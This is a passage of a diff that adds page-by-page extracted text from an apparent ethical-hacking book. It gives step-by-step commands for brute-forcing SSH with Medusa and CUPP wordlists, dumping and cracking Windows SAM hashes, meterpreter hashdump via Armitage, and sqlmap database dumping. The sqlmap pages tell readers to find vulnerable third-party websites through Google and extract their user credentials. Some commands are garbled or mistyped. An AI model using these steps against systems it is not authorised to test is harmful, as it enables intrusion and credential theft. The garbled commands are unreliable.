+    \    * Normally new devices won't respond to the ping requests to the multicast\
+    \ group"
+  merge: -1
+  pgno: 128
+- img_proc: true
+  md: '# Personalized Dictionary Lists with CUPP (Common User Password Profiler)
+
+
+    # Dictionary Attack
+
+
+    +   - Most people use words as passwords
+
+    - Try all dictionary words before trying a brute force attack
+
+    - Makes the attack much faster
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_129_0.png)
+
+
+    People spend a lot of time preparing for effective dictionary attack. Common User
+    Passwords Profiler (CUPP) is made to simplify this attack method that is often
+    used as last resort in penetration testing and forensic crime investigations.
+
+
+    Working on a dictionary attack it is important to understand person’s attributes,
+    name, birthday, family names, hobbies, etc. Next step is to create a database
+    with all those attributes.
+
+
+    To initiate a dictionary attack:
+
+
+    +   - Tools like CUPP and Medusa can be used
+
+    - cd /usr/lib/cupp -- The directory might be different based on your version
+
+    - Edit the configuration file based on your requirements'
+  merge: -1
+  pgno: 129
+- img_proc: true
+  md: '+   - ./cupp.py -i -- This will create the password list for us - -i to be
+    interactive and asking questions
+
+    - medusa -h 10.0.0.1 -u steve -P /usr/lib/cupps/steve.txt -e ns -F ssh - -M ssh
+    - - Username is steve, password file specified, -e for no password or same as
+    username, -F stop after success, -M specifies the module (SSH)'
+  merge: -1
+  pgno: 130
+- img_proc: true
+  md: '# Accessing the SAM database and cracking passwords
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_131_0.png)
+
+
+    The Security Accounts Manager (SAM) is a database in the Windows operating system
+    (OS) that contains user names and passwords. SAM is part of the registry and can
+    be found on the hard disk.
+
+
+    Although only hash copy of passwords can be found on SAM files, there are tools
+    which can be used to crack the passwords. Two common tools in this category are
+    Samdump2 and John the Ripper tools.
+
+
+    To be able to initiate a SAM database attack you need to gain access to the Windows
+    machine (physical or remote).
+
+
+    Next steps are using live CD to boot the box (with physical access) and dump the
+    hash. Then we can work on offline Password Cracking of Hashes.'
+  merge: -1
+  pgno: 131
+- img_proc: true
+  md: 'There are tools like Rainbow table which is a list of hashes (out of dictionary
+    list) which can be used to compare hashes. This will be a much quicker process
+    compare to password cracking as we only compare hashes and not creating one every
+    time during the attack.
+
+
+    Steps to crack a SAM file:
+
+
+    +   - Boot the PC with Live CD of Kali
+
+    - fdisk -l (Lowercase L) -- To find the Windows filesystem
+
+    - mkdir tempfolder
+
+    - mount /dev/sda2 /root/tempfolder -- This will mount the partition to tempfolder
+
+    - cd /root/tempfolder
+
+    - cd /Windows/System32/config
+
+    - bkhive SYSTEM /root/key.txt -- Get the content of SYSTEM and put it in key.txt
+
+    - samdump2 SAM /root/key.txt > /hashfile.txt -- This will be our hash file which
+    we can used with other tools like John the Ripper to crack the password
+
+    - cd /pentest/passwords/john -- Location of Joh the Ripper tool
+
+    - ./john/root/hashfile.txt -format=nt2 -users=Administrator -- This will start
+    cracking the hash file to find the password for user Administrator'
+  merge: -1
+  pgno: 132
+- img_proc: true
+  md: "# # Describe and Use a Rainbow Table\n\n# # What is a Rainbow Table ?\n\n![](img/c6b688dca6570d17db3036b560ef0905_133_0.png)\n\
+    \nA rainbow table is a listing of all possible plaintext permutations of encrypted\
+    \ passwords specific to a given hash algorithm.\n\nRainbow tables are often used\
+    \ by password cracking software for network security attacks. All computer systems\
+    \ that require password-based authentication store databases of passwords associated\
+    \ with user accounts, typically encrypted rather than plaintext as a security\
+    \ measure.\n\n+   - Rainbow table will compare the hash with a hash list instead\
+    \ of checking clear text passwords\n  - This will make it much quicker to find\
+    \ the password\n  - We can download the rainbow tables on Internet\n- Using tools\
+    \ like armitage, meterpreter, ophcrack\n- An example of using a rainbow table:\n\
+    - Run armitage\n- Do a quick namp scan to find the device"
+  merge: -1
+  pgno: 133
+- img_proc: true
+  md: "+   - Or: nbtscan 10.0.0.0/24 -- Just looking for Netbios (Microsoft) devices\n\
+    \n+   - Find attacks on armitage\n- Launch the netapi attack\n- Show sessions\
+    \ -- shows the meterpreter sessions to the device\n- hashdump -- This command\
+    \ will show all the hashes available on the victim (windows machine)\n- On Password\
+    \ attacks -> Offline attacks -> select Ophcrack-GUI\n- Select the Load and add\
+    \ the single hash in there\n- Under tables select the rainbow table that you want\
+    \ to use\n  - To download rainbow tables you can Google \"ophcrack tables\"\n\
+    \  - You can install it then on Ophcrack\n- Click on Crack to initiate the crack"
+  merge: -1
+  pgno: 134
+- img_proc: true
+  md: "# Hacking a vulnerable website with PHP, MYSQL using Sqlmap\n\n![](img/c6b688dca6570d17db3036b560ef0905_135_0.png)\n\
+    \nSqlmap is an open source penetration testing tool that automates the process\
+    \ of detecting and exploiting SQL injection flaws and taking over of database\
+    \ servers. It comes with a powerful detection engine, many niche features for\
+    \ the ultimate penetration tester and a broad range of switches lasting from database\
+    \ fingerprinting, over data fetching from the database, to accessing the underlying\
+    \ file system and executing commands on the operating system via out-of-band connections.\n\
+    \nBelow example shows how to hack a vulnerable website using Sqlmap.\n\n+   *\
+    \ You can find a vulnerable website by Googling something like \"phpid=1\"\n \
+    \ * To make sure that the site is vulnerable, add ' ' character at the end of\
+    \ the url and see if it comes up with a SQL error\n  * If it does, you can start\
+    \ working on that website\n* On this example, the vulnerable url is http://www.domain.com/page.php?id=1\n\
+    * On Kali we will use sqlmap to analyse the vulnerability\n* Below command will\
+    \ give you a list of all databases on that host\n  * sqlmap -u http://www.domain.com/page.php?id=1\
+    \ --dbs\n* Next you can get a list of all tables for a particular database (www\
+    \ DB in the below example)\n  * sqlmap -u http://www.domain.com/page.php?id=1\
+    \ -D --tables"
+  merge: -1
+  pgno: 135
+- img_proc: true
+  md: "+   Choose your table, e.g. tbl_users, tbl_login, etc and use the below command\
+    \ to get the columns available on that table.\n  sqlmap -u http://www.domain.com/page.php?id=1\
+    \ -D www -T tbl_login --columns\n\n+   You might see columns like username, login,\
+    \ password, etc. Try the below command to get the records on that columns, for\
+    \ instance all records in username column of www database and tbl_login table\n\
+    \  sqlmap -u http://www.domain.com/page.php?id=1 -D www -T tbl_login -C username\
+    \ --dumpwill\n\n+   To get a list of passwords available on table tbl_login try\
+    \ to list the password column of that database\n  sqlmap -u http://www.domain.com/page.php?id=1\
+    \ -D www -T tbl_login -C password --dump\n\n+   You should have a list of usernames\
+    \ and passwords now."
+  merge: -1
+  pgno: 136
+- img_proc: true
+  md: "# Wireshark protocol analyser\n\n![](img/c6b688dca6570d17db3036b560ef0905_137_0.png)\n\
+    \nWireshark is a free and open-source packet analyser. It is used for network\
+    \ troubleshooting, analysis, software and communications protocol development,\
+    \ and education.\n\nNote: We won't be covering the basics of using Wireshark in\
+    \ this book as it is a prerequisite for being an Ethical hacker. There are lots\
+    \ of training materials and online videos which can be used to get familiar with\
+    \ Wireshark.\n\n+   - You can use Wireshark to capture the traffic in different\
+    \ ways\n  * MITM attack\n  * Port mirroring on switch\n  * Normal packet capture\
+    \ on the network via its interface\n\nWe explain some of the interesting features\
+    \ of the Wireshark which are not commonly used.\n\n+   - You can change the colours\
+    \ of packets to suit your requirements\n- You can change Flags or anything inside\
+    \ the packet on the column on the main windows to show all the time by right click\
+    \ on it and “As as Column\"\n- Statistics menu and Summary will give you a summary\
+    \ of the file\n- Statistics menu and protocol hierarchy will show how much each\
+    \ protocol used\n- Statistics menu and conversation to check the connections and\
+    \ you can filter the traffic in there too"
+  merge: -1
+  pgno: 137
+- img_proc: true
+  md: '+   - Statistics menu and endpoint will show the top talkers and how much traffic
+    each host is generating
+
+    - Statistics menu and packet length will show create the packet lengths
+
+    - Statistics menu and IO graphs, you can use this to create a graph for specific
+    traffic based on the filters
+
+    - Statistics menu and http you can view all the http requests and their details
+
+    - Statistics menu and Flow Graph will show you a Graph about the conversations
+    on the captured traffic
+
+    - If you don''t have graphical interface you can use tshark command'
+  merge: -1
+  pgno: 138
+- img_proc: true
+  md: "# Detecting a Root kit\n\n```\nssdpapi.dll  WINDOWS\\system32  34816\nsspsrv.dll\
+    \  WINDOWS\\system32  71680\nssflubox.scr  WINDOWS\\system32  393216\nssmarques.scr\
+    \ WINDOWS\\system32  20992\nssmypics.scr WINDOWS\\system32  427104\nssyst.scr\
+    \     WINDOWS\\system32  189944\nsspipes.scr   WINDOWS\\system32  610304\nssplt30.scr\
+    \  WINDOWS\\system32  172768\nssstars.scr   WINDOWS\\system32  143168\nssextd3.dir\
+    \ WINDOWS\\system32  679936\nStatus -MPF WINDOWS\\system32  63296\nclient.dll\
+    \ WINDOWS\\system32  59392\ndlo32.tlb    WINDOWS\\system32  71168\nsti.dll   \
+    \   WINDOWS\\system32  68096\nsti_ci.dll   WINDOWS\\system32  136794\nstim.exe\
+    \     WINDOWS\\system32  148488\nstobject.dll WINDOWS\\system32  121856\nstorage.dll\
+    \ WINDOWS\\system32  4208\nstorprop.dll WINDOWS\\system32  247252\nstream1.dll\
+    \ WINDOWS\\system32  8192\nstrdll.dll   WINDOWS\\system32  AskRootRank.com\n```\n\
+    \nA rootkit is a stealthy type of software, typically malicious, designed to hide\
+    \ the existence of certain processes or programs from normal methods of detection\
+    \ and continue privileged access to a computer.\n\n+   * Generally implemented\
+    \ by someone who is an attacker\n* You normally won’t know about it\n* Tools to\
+    \ detect\n  * rkhunter\n  * chkrootkit\n* You can install them by apt-get\n* dpkg\
+    \ -l | grep rkhunter -- To check if it is already installed\n* locate chkrootkit\n\
+    * Navigate to folder\n  * ./chkrootkit -h\n  * ./chkrootkit -- This will check\
+    \ and give you the results\n* Locate rkhunter\n* Locate rkhunter"
+  merge: -1
+  pgno: 139
+- img_proc: true
+  md: '+   - rhunter
+
+    - rhunter -update -- To update the database
+
+    - rhunter -c -- To check for a rootkit'
+  merge: -1
+  pgno: 140
+- img_proc: true
+  md: "# Creating a test BED with Virtual box\n\nTo install Kali in a testing environment\
+    \ and have enough tools to do the checks and exploits you will need the following\
+    \ software:\n\n+   * Virtual box\n  * Download from https://www.virtualbox.org/wiki/Downloads\n\
+    * Kali Linux\n  * Download from http://www.kali.org/downloads/\n* Metasploitable2\
+    \ -- Linux distribution - Virtual machine which is vulnerable and can be used\
+    \ for tests\n  * Download from Sourceforge:\n    http://sourceforge.net/projects/metasploitable/files/Metasploitable2/\n\
+    * Windows, Linux, etc\n* GNS3\n  * Optional, if you are familiar with Cisco products\n\
+    \n# Steps to install Kali Linux on Virtual box\n\n+   1. Create a new Linux Virtual\
+    \ machine\n2. 1 or 2 virtual CPU and 512MB of RAM should be enough\n3. Follow\
+    \ the prompts to create a virtual disk with 8GB of disk space\n4. Select network\
+    \ adapter mode\n  a. Bridge mode: With choosing this, your Kali will be on the\
+    \ same physical network as your PC\n  b. NAT mode: With choosing this, your Kali\
+    \ will have internet access but behind your PC\n  c. Host Only mode: With choosing\
+    \ this, your Kali will not have Internet access and inter-communication between\
+    \ virtual machines will be allowed\n5. Make sure you enable PAE feature for the\
+    \ CPU\n\nFollow the next steps on the below images to install Kali."
+  merge: -1
+  pgno: 141
+- img_proc: true
+  md: '![](img/c6b688dca6570d17db3036b560ef0905_142_0.png)'
+  merge: -1
+  pgno: 142
+- img_proc: true
+  md: '![](img/c6b688dca6570d17db3036b560ef0905_143_0.png)'
+  merge: -1
+  pgno: 143
+- img_proc: true
+  md: '![](img/c6b688dca6570d17db3036b560ef0905_144_0.png)
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_144_1.png)'
+  merge: -1
+  pgno: 144
+- img_proc: true
+  md: '![](img/c6b688dca6570d17db3036b560ef0905_145_0.png)
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_145_1.png)'
+  merge: -1
+  pgno: 145
+- img_proc: true
+  md: '![](img/c6b688dca6570d17db3036b560ef0905_146_0.png)'
+  merge: -1
+  pgno: 146
